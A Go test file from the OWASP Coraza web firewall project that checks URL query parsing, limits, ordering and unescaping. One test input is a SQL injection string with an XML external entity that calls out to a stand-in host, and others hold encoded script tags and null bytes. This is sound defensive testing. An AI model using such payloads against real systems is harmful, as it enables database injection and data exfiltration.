// Copyright 2022 Juan Pablo Tosso and the OWASP Coraza contributors
// SPDX-License-Identifier: Apache-2.0

package url

import (
	"testing"
)

var parseQueryInput = `var=EmptyValue'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % awpsd SYSTEM "http://0cddnr5evws01h2bfzn5zd0cm3sxvrjv7oufi4.example'||'foo.bar/">%awpsd;`

func TestUrlPayloads(t *testing.T) {
	q, _ := ParseQuery(parseQueryInput, '&', 0)
	if len(q["var"]) == 0 {
		t.Error("var is empty")
	}
}

func TestParseQueryLimit(t *testing.T) {
	q, truncated := ParseQuery("a=1&b=2&c=3&d=4", '&', 2)
	if !truncated {
		t.Error("expected truncated to be true")
	}
	if len(q) != 2 {
		t.Errorf("expected 2 parsed pairs, got %d: %v", len(q), q)
	}

	q, truncated = ParseQuery("a=1&b=2&c=3&d=4", '&', 10)
	if truncated {
		t.Error("expected truncated to be false when limit is not reached")
	}
	if len(q) != 4 {
		t.Errorf("expected 4 parsed pairs, got %d: %v", len(q), q)
	}

	q, truncated = ParseQuery("a=1&b=2", '&', 0)
	if truncated {
		t.Error("expected truncated to be false when limit is 0 (no limit)")
	}
	if len(q) != 2 {
		t.Errorf("expected 2 parsed pairs, got %d: %v", len(q), q)
	}
}

func TestParseQueryLimitCountsTotalPairsNotDistinctKeys(t *testing.T) {
	// Many values under a single repeated key must still be bounded by the
	// limit, not just the number of distinct keys.
	q, truncated := ParseQuery("a=1&a=1&a=1&a=1&a=1", '&', 2)
	if !truncated {
		t.Error("expected truncated to be true")
	}
	if got := len(q["a"]); got != 2 {
		t.Errorf("expected 2 values under repeated key 'a', got %d: %v", got, q["a"])
	}
}

func TestParseQueryOrdered(t *testing.T) {
	pairs, truncated := ParseQueryOrdered("a=1&b=2&c=3", '&', 0)
	if truncated {
		t.Error("expected truncated to be false when limit is 0 (no limit)")
	}
	want := []KeyValue{
		{Key: "a", Value: "1", RawKey: "a", RawValue: "1"},
		{Key: "b", Value: "2", RawKey: "b", RawValue: "2"},
		{Key: "c", Value: "3", RawKey: "c", RawValue: "3"},
	}
	if len(pairs) != len(want) {
		t.Fatalf("expected %d pairs, got %d: %v", len(want), len(pairs), pairs)
	}
	for i, kv := range want {
		if pairs[i] != kv {
			t.Errorf("pair %d: got %+v, want %+v", i, pairs[i], kv)
		}
	}
}

func TestParseQueryOrderedLimit(t *testing.T) {
	pairs, truncated := ParseQueryOrdered("a=1&b=2&c=3&d=4", '&', 2)
	if !truncated {
		t.Error("expected truncated to be true")
	}
	if len(pairs) != 2 {
		t.Fatalf("expected 2 pairs, got %d: %v", len(pairs), pairs)
	}
	if pairs[0].Key != "a" || pairs[1].Key != "b" {
		t.Errorf("expected pairs in order [a b], got %v", pairs)
	}
}

// TestParseQueryLimitTrailingSeparatorAtLimit is a regression test: the limit
// check used to run before the empty-key skip, so a trailing separator right
// at the limit reported truncation even though nothing more was dropped.
func TestParseQueryLimitTrailingSeparatorAtLimit(t *testing.T) {
	q, truncated := ParseQuery("a=1&b=2&&", '&', 2)
	if truncated {
		t.Error("expected truncated to be false: the trailing '&&' adds no pair beyond the limit")
	}
	if len(q) != 2 {
		t.Errorf("expected 2 parsed pairs, got %d: %v", len(q), q)
	}
}

// TestParseQueryOrderedTrailingSeparatorAtLimit mirrors
// TestParseQueryLimitTrailingSeparatorAtLimit for the ordered parser.
func TestParseQueryOrderedTrailingSeparatorAtLimit(t *testing.T) {
	pairs, truncated := ParseQueryOrdered("a=1&b=2&&", '&', 2)
	if truncated {
		t.Error("expected truncated to be false: the trailing '&&' adds no pair beyond the limit")
	}
	if len(pairs) != 2 {
		t.Errorf("expected 2 parsed pairs, got %d: %v", len(pairs), pairs)
	}
}

func BenchmarkParseQuery(b *testing.B) {
	for i := 0; i < b.N; i++ {
		ParseQuery(parseQueryInput, '&', 0)
	}
}

func BenchmarkParseQueryLimited(b *testing.B) {
	for i := 0; i < b.N; i++ {
		ParseQuery(parseQueryInput, '&', 1)
	}
}

var queryUnescapePayloads = map[string]string{
	"sample":    "sample",
	"s%20ample": "s ample",
	"s+ample":   "s ample",
	"s%2fample": "s/ample",
	"s% ample":  "s% ample",  // non-strict sample
	"s%ssample": "s%ssample", // non-strict sample
	"s%00ample": "s\x00ample",
	"%7B%%7d":   "{%}",
	"%7B+%+%7d": "{ % }",
}

func TestQueryUnescape(t *testing.T) {
	for k, v := range queryUnescapePayloads {
		if out := queryUnescape(k); out != v {
			t.Errorf("Error parsing %q, got %q and expected %q", k, out, v)
		}
	}
}

func BenchmarkQueryUnescape(b *testing.B) {
	for i := 0; i < b.N; i++ {
		for k := range queryUnescapePayloads {
			queryUnescape(k)
		}
	}
}

func TestParseQueryRaw(t *testing.T) {
	tests := []struct {
		name  string
		input string
		want  map[string][]string
	}{
		{
			name:  "preserves percent-encoded values",
			input: "key=%3Cscript%3E&other=hello",
			want: map[string][]string{
				"key":   {"%3Cscript%3E"},
				"other": {"hello"},
			},
		},
		{
			name:  "preserves double encoding",
			input: "password=Secret%2500",
			want: map[string][]string{
				"password": {"Secret%2500"},
			},
		},
		{
			name:  "preserves plus signs",
			input: "q=hello+world",
			want: map[string][]string{
				"q": {"hello+world"},
			},
		},
		{
			name:  "preserves encoded key names",
			input: "p%61ssword=test",
			want: map[string][]string{
				"p%61ssword": {"test"},
			},
		},
		{
			name:  "empty value",
			input: "key=",
			want: map[string][]string{
				"key": {""},
			},
		},
		{
			name:  "no value (no equals)",
			input: "key",
			want: map[string][]string{
				"key": {""},
			},
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, _ := ParseQueryRaw(tt.input, '&', 0)
			for k, wantVals := range tt.want {
				gotVals, ok := got[k]
				if !ok {
					t.Errorf("missing key %q", k)
					continue
				}
				if len(gotVals) != len(wantVals) {
					t.Errorf("key %q: got %d values, want %d", k, len(gotVals), len(wantVals))
					continue
				}
				for i, wv := range wantVals {
					if gotVals[i] != wv {
						t.Errorf("key %q[%d]: got %q, want %q", k, i, gotVals[i], wv)
					}
				}
			}
		})
	}
}

func TestParseQueryBoth(t *testing.T) {
	input := "key=%3Cscript%3E&p%61ssword=Secret%2500&plain=hello"
	decoded, raw, truncated := ParseQueryBoth(input, '&', 0)
	if truncated {
		t.Fatal("unexpected truncation")
	}

	// Verify decoded values
	if v := decoded["key"]; len(v) != 1 || v[0] != "<script>" {
		t.Errorf("decoded key: got %v, want [<script>]", v)
	}
	if v := decoded["password"]; len(v) != 1 || v[0] != "Secret%00" {
		t.Errorf("decoded password: got %v, want [Secret%%00]", v)
	}
	if v := decoded["plain"]; len(v) != 1 || v[0] != "hello" {
		t.Errorf("decoded plain: got %v, want [hello]", v)
	}

	// Verify raw values
	if v := raw["key"]; len(v) != 1 || v[0] != "%3Cscript%3E" {
		t.Errorf("raw key: got %v, want [%%3Cscript%%3E]", v)
	}
	if v := raw["p%61ssword"]; len(v) != 1 || v[0] != "Secret%2500" {
		t.Errorf("raw password: got %v, want [Secret%%2500]", v)
	}
	if v := raw["plain"]; len(v) != 1 || v[0] != "hello" {
		t.Errorf("raw plain: got %v, want [hello]", v)
	}
}

func TestParseQueryOrderedRawFields(t *testing.T) {
	input := "key=%3Cscript%3E&p%61ssword=Secret%2500&q=hello+world"
	pairs, truncated := ParseQueryOrdered(input, '&', 0)
	if truncated {
		t.Fatal("unexpected truncation")
	}
	if len(pairs) != 3 {
		t.Fatalf("expected 3 pairs, got %d", len(pairs))
	}

	if pairs[0].Key != "key" || pairs[0].Value != "<script>" || pairs[0].RawKey != "key" || pairs[0].RawValue != "%3Cscript%3E" {
		t.Errorf("pair 0 mismatch: %+v", pairs[0])
	}
	if pairs[1].Key != "password" || pairs[1].Value != "Secret%00" || pairs[1].RawKey != "p%61ssword" || pairs[1].RawValue != "Secret%2500" {
		t.Errorf("pair 1 mismatch: %+v", pairs[1])
	}
	if pairs[2].Key != "q" || pairs[2].Value != "hello world" || pairs[2].RawKey != "q" || pairs[2].RawValue != "hello+world" {
		t.Errorf("pair 2 mismatch: %+v", pairs[2])
	}
}
